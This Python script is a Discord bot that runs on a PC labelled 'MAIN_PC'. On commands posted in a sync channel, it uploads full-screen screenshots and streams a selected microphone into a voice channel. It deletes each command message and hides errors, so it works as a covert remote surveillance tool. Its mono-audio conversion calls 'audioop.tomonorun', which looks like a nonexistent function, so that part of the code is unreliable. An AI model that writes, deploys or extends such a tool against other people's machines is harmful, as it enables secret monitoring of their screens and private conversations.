import discord
import time
from datetime import datetime
import os
import asyncio
from mss import MSS
import mss.tools
import io

# === CONFIGURATION ===
TOKEN = 'PLACEHOLDER'  
SYNC_CHANNEL_ID = 1515494790576209930  
PREFIX = "."  
# =====================

class MyBot(discord.Client):
    def __init__(self):
        super().__init__(intents=discord.Intents.all())
        self.is_main_pc = True
        self.identity = "MAIN_PC"
        self.voice_client = None
        self.current_mic_id = 0  
        self.audio_task = None   
        self.boot_time = time.time()  # Records the exact second the PC script launches

client = MyBot()

class MicrophoneAudioSource(discord.AudioSource):
    def __init__(self, device_index):
        import pyaudio
        self.p = pyaudio.PyAudio()
        try:
            device_info = self.p.get_device_info_by_host_api_device_index(0, device_index)
            self.channels = int(device_info.get('maxInputChannels', 1))
        except Exception:
            self.channels = 1
        self.rate = 48000
        self.chunk = 960  
        self.stream = self.p.open(
            format=pyaudio.paInt16,
            channels=self.channels,
            rate=self.rate,
            input=True,
            input_device_index=device_index,
            frames_per_buffer=self.chunk
        )

    def read(self):
        try:
            data = self.stream.read(self.chunk, exception_on_overflow=False)
            if self.channels == 1:
                import audioop
                data = audioop.tomonorun(data, 2, 1, 0)
            return data
        except Exception:
            return b'\x00' * 3840  

    def cleanup(self):
        try:
            self.stream.stop_stream()
            self.stream.close()
        except Exception: pass
        self.p.terminate()

async def start_voice_stream(vc, device_index):
    try:
        if vc.is_playing():
            vc.stop()
        source = MicrophoneAudioSource(device_index)
        vc.play(source)
    except Exception as e:
        sync_channel = client.get_channel(SYNC_CHANNEL_ID)
        if sync_channel:
            await sync_channel.send(f"🚨 BOT_ERROR: Failed to initialize audio pipeline: {e}")

@client.event
async def on_ready():
    print(f"🤖 Bot launched successfully as: {client.identity}")
    while True:
        channel = client.get_channel(SYNC_CHANNEL_ID)
        if channel:
            try: 
                # Sends its personal boot timestamp as part of the heartbeat signal
                await channel.send(f"📢 BOT_SIGNAL:HEARTBEAT:{client.identity}:{client.boot_time}")
            except Exception: pass
        await asyncio.sleep(30)

@client.event
async def on_message(message):
    if message.author.id == client.user.id:
        if message.content == "📢 BOT_SIGNAL:TAKE_SCREENSHOT":
            try:
                temp_path = os.path.join(os.environ.get('TEMP', 'C:\\'), 'ss.png')
                with MSS() as sct:
                    all_monitors = sct.monitors[0]
                    sct_img = sct.grab(all_monitors)
                    mss.tools.to_png(sct_img.rgb, sct_img.size, output=temp_path)
                channel = client.get_channel(SYNC_CHANNEL_ID)
                if channel:
                    file = discord.File(temp_path, filename="screenshot.png")
                    await channel.send(content="📢 BOT_SIGNAL:SCREENSHOT_DATA", file=file)
                if os.path.exists(temp_path): os.remove(temp_path)
            except Exception: pass
            try: await message.delete()
            except Exception: pass

        elif message.content.startswith("📢 BOT_SIGNAL:MIC_JOIN:"):
            try:
                vc_id = int(message.content.split(":")[-1])
                vc_channel = client.get_channel(vc_id)
                if vc_channel:
                    if client.voice_client and client.voice_client.is_connected():
                        await client.voice_client.disconnect()
                    client.voice_client = await vc_channel.connect()
                    await start_voice_stream(client.voice_client, client.current_mic_id)
                else:
                    sync_channel = client.get_channel(SYNC_CHANNEL_ID)
                    if sync_channel: await sync_channel.send(f"🚨 BOT_ERROR: VC ID {vc_id} not found.")
            except Exception as e:
                sync_channel = client.get_channel(SYNC_CHANNEL_ID)
                if sync_channel:
                    try: await sync_channel.send(f"🚨 BOT_ERROR: Voice engine crash: {e}")
                    except Exception: pass
            try: await message.delete()
            except Exception: pass

        elif message.content == "📢 BOT_SIGNAL:MIC_LIST":
            try:
                import pyaudio
                p = pyaudio.PyAudio()
                info = p.get_host_api_info_by_index(0)
                numdevices = info.get('deviceCount')
                mic_list = "🎙️ **Available Microphones:**\n"
                display_index = 1
                for i in range(0, numdevices):
                    device_info = p.get_device_info_by_host_api_device_index(0, i)
                    if device_info.get('maxInputChannels') > 0:
                        mic_list += f"**{display_index}**. `{device_info.get('name')}`\n"
                        display_index += 1
                p.terminate()
            except Exception as e:
                mic_list = f"🛑 **Audio Error:** `pyaudio` issue: {e}"
            try:
                channel = client.get_channel(SYNC_CHANNEL_ID)
                if channel: await channel.send(mic_list)
            except Exception: pass
            try: await message.delete()
            except Exception: pass

        elif message.content.startswith("📢 BOT_SIGNAL:MIC_SELECT:"):
            try:
                selection = message.content.split(":")[-1].strip()
                import pyaudio
                p = pyaudio.PyAudio()
                info = p.get_host_api_info_by_index(0)
                numdevices = info.get('deviceCount')
                valid_mics = []
                for i in range(0, numdevices):
                    device_info = p.get_device_info_by_host_api_device_index(0, i)
                    if device_info.get('maxInputChannels') > 0:
                        valid_mics.append((i, device_info.get('name')))
                p.terminate()
                channel = client.get_channel(SYNC_CHANNEL_ID)
                if not channel: return
                try:
                    user_idx = int(selection) - 1
                    if 0 <= user_idx < len(valid_mics):
                        system_id, mic_name = valid_mics[user_idx]
                        client.current_mic_id = system_id  
                        await channel.send(f"✅ **Success:** Target microphone set to source **{selection}** (`{mic_name}`).")
                        if client.voice_client and client.voice_client.is_connected():
                            await start_voice_stream(client.voice_client, client.current_mic_id)
                    else:
                        await channel.send(f"❌ **Error:** `{selection}` is an invalid selection number.")
                except ValueError:
                    await channel.send(f"❌ **Error:** Please provide a valid number choice.")
            except Exception: pass
            try: await message.delete()
            except Exception: pass

client.run(TOKEN)
